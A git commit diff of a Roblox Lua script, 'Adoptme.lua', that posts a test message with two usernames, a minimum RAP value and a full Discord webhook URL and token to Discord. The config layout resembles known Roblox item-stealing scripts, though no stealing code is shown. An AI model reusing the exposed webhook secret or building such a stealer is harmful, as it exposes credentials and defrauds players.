c562323c1a5b19f5521a7fe42244a9839a51fd5c
vitolkn <vitolkn99@gmail.com>
2025-01-17 23:42:01 -0300

    Update Adoptme.lua

--- Adoptme.lua
+++ Adoptme.lua
@@ -1,5 +1,21 @@
--- Configurações
-Username = "vitinZzica"
-Username2 = "vitinZzica"
-MinimumRAP = 100000
-Webhook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"
+local HttpService = game:GetService("HttpService")
+
+local Username = "vitinZzica"
+local Username2 = "vitinZzica"
+local MinimumRAP = 100000
+local Webhook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"
+
+local data = {
+    content = "Teste de mensagem para o Discord!",
+    embeds = {
+        {
+            title = "Informações",
+            description = "Username1: " .. Username .. "\nUsername2: " .. Username2 .. "\nMinimum RAP: " .. MinimumRAP,
+            color = 5814783 -- Cor do embed (opcional)
+        }
+    }
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+HttpService:PostAsync(Webhook, jsonData, Enum.HttpContentType.ApplicationJson)
